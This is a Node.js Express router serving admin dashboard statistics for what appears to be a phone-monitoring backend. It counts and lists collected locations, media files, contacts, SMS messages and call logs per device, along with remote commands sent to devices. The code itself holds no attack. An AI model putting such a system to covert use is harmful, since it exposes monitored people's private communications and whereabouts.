const express = require('express');
const { Op, sequelize } = require('sequelize');
const { Device, Location, MediaFile, Contact, SMS, CallLog, Command } = require('../config/database');
const { authenticateToken, requireAdmin } = require('../middleware/auth');
const logger = require('../utils/logger');

const router = express.Router();

// Get dashboard stats (Admin only) - Simplified version for quick loading
router.get('/stats', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const [
      totalDevices,
      activeDevices,
      offlineDevices,
      totalCommands
    ] = await Promise.all([
      Device.count(),
      Device.count({ where: { status: 'active' } }),
      Device.count({ where: { status: 'inactive' } }),
      Command.count()
    ]);

    res.json({
      success: true,
      data: {
        totalDevices,
        activeDevices,
        offlineDevices,
        totalCommands
      }
    });
  } catch (error) {
    logger.error('Get dashboard stats error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error',
      message: error.message
    });
  }
});

// Get dashboard overview (Admin only)
router.get('/overview', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const [
      totalDevices,
      onlineDevices,
      totalLocations,
      totalMediaFiles,
      totalContacts,
      totalSMS,
      totalCallLogs,
      pendingCommands
    ] = await Promise.all([
      Device.count(),
      Device.count({ where: { status: 'online' } }),
      Location.count(),
      MediaFile.count({ where: { is_deleted: false } }),
      Contact.count({ where: { is_deleted: false } }),
      SMS.count({ where: { is_deleted: false } }),
      CallLog.count({ where: { is_deleted: false } }),
      Command.count({
        where: {
          status: ['pending', 'sent'],
          expires_at: { [Op.gt]: new Date() }
        }
      })
    ]);

    // Get recent activity
    const recentDevices = await Device.findAll({
      limit: 5,
      order: [['lastSeen', 'DESC']],
      attributes: [
        'id', 
        'deviceId', 
        'name', 
        'status', 
        ['lastSeen', 'lastSeen'], 
        ['battery_level', 'batteryLevel']
      ],
      where: {
        deleted_at: null
      },
      raw: true
    });

    const recentLocations = await Location.findAll({
      limit: 10,
      order: [['timestamp', 'DESC']],
      include: [
        {
          model: Device,
          as: 'device',
          attributes: [['deviceId', 'device_id'], 'name']
        }
      ]
    });

    res.json({
      success: true,
      data: {
        statistics: {
          devices: {
            total: totalDevices,
            online: onlineDevices,
            offline: totalDevices - onlineDevices
          },
          data: {
            locations: totalLocations,
            media_files: totalMediaFiles,
            contacts: totalContacts,
            sms_messages: totalSMS,
            call_logs: totalCallLogs
          },
          commands: {
            pending: pendingCommands
          }
        },
        recent_activity: {
          devices: recentDevices,
          locations: recentLocations
        }
      }
    });
  } catch (error) {
    logger.error('Get dashboard overview error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Get device activity chart data (Admin only)
router.get('/activity/devices', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { days = 7 } = req.query;
    const startDate = new Date();
    startDate.setDate(startDate.getDate() - parseInt(days));

    const activity = await Location.findAll({
      where: {
        timestamp: { [Op.gte]: startDate }
      },
      attributes: [
        [sequelize.fn('DATE', sequelize.col('timestamp')), 'date'],
        [sequelize.fn('COUNT', sequelize.fn('DISTINCT', sequelize.col('device_id'))), 'active_devices'],
        [sequelize.fn('COUNT', sequelize.col('id')), 'location_updates']
      ],
      group: [sequelize.fn('DATE', sequelize.col('timestamp'))],
      order: [[sequelize.fn('DATE', sequelize.col('timestamp')), 'ASC']]
    });

    res.json({
      success: true,
      data: { activity }
    });
  } catch (error) {
    logger.error('Get device activity error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Get data usage statistics (Admin only)
router.get('/stats/data-usage', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const mediaStats = await MediaFile.findAll({
      where: { is_deleted: false },
      attributes: [
        'media_type',
        [sequelize.fn('COUNT', sequelize.col('id')), 'count'],
        [sequelize.fn('SUM', sequelize.col('file_size')), 'total_size']
      ],
      group: ['media_type']
    });

    const deviceStats = await Device.findAll({
      attributes: [
        'id',
        'deviceId',
        'name',
        [sequelize.literal('(SELECT COUNT(*) FROM locations WHERE device_id = Device.deviceId)'), 'location_count'],
        [sequelize.literal('(SELECT COUNT(*) FROM media_files WHERE device_id = Device.deviceId AND is_deleted = false)'), 'media_count'],
        [sequelize.literal('(SELECT SUM(file_size) FROM media_files WHERE device_id = Device.deviceId AND is_deleted = false)'), 'media_size']
      ],
      order: [['name', 'ASC']]
    });

    res.json({
      success: true,
      data: {
        media_by_type: mediaStats,
        device_usage: deviceStats
      }
    });
  } catch (error) {
    logger.error('Get data usage stats error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Get command statistics (Admin only)
router.get('/stats/commands', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const commandStats = await Command.findAll({
      attributes: [
        'command_type',
        'status',
        [sequelize.fn('COUNT', sequelize.col('id')), 'count']
      ],
      group: ['command_type', 'status'],
      order: [['command_type', 'ASC'], ['status', 'ASC']]
    });

    const recentCommands = await Command.findAll({
      limit: 20,
      order: [['created_at', 'DESC']],
      include: [
        {
          model: Device,
          as: 'device',
          attributes: [['deviceId', 'device_id'], 'name']
        }
      ]
    });

    res.json({
      success: true,
      data: {
        command_statistics: commandStats,
        recent_commands: recentCommands
      }
    });
  } catch (error) {
    logger.error('Get command stats error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Get system health (Admin only)
router.get('/health', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const now = new Date();
    const oneHourAgo = new Date(now.getTime() - 60 * 60 * 1000);
    const oneDayAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);

    const [
      devicesOnline,
      devicesSeenLastHour,
      devicesSeenLastDay,
      recentErrors,
      diskUsage
    ] = await Promise.all([
      Device.count({ where: { status: 'online' } }),
      Device.count({ where: { last_seen: { [Op.gte]: oneHourAgo } } }),
      Device.count({ where: { last_seen: { [Op.gte]: oneDayAgo } } }),
      Command.count({
        where: {
          status: 'failed',
          created_at: { [Op.gte]: oneDayAgo }
        }
      }),
      // Calculate disk usage (simplified)
      MediaFile.sum('file_size', { where: { is_deleted: false } })
    ]);

    const health = {
      status: 'healthy',
      devices: {
        online: devicesOnline,
        seen_last_hour: devicesSeenLastHour,
        seen_last_day: devicesSeenLastDay
      },
      errors: {
        recent_command_failures: recentErrors
      },
      storage: {
        used_bytes: diskUsage || 0,
        used_mb: Math.round((diskUsage || 0) / (1024 * 1024))
      },
      uptime: process.uptime(),
      memory_usage: process.memoryUsage()
    };

    // Determine overall health status
    if (recentErrors > 10) {
      health.status = 'warning';
    }
    if (devicesOnline === 0 || recentErrors > 50) {
      health.status = 'critical';
    }

    res.json({
      success: true,
      data: { health }
    });
  } catch (error) {
    logger.error('Get system health error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

module.exports = router;
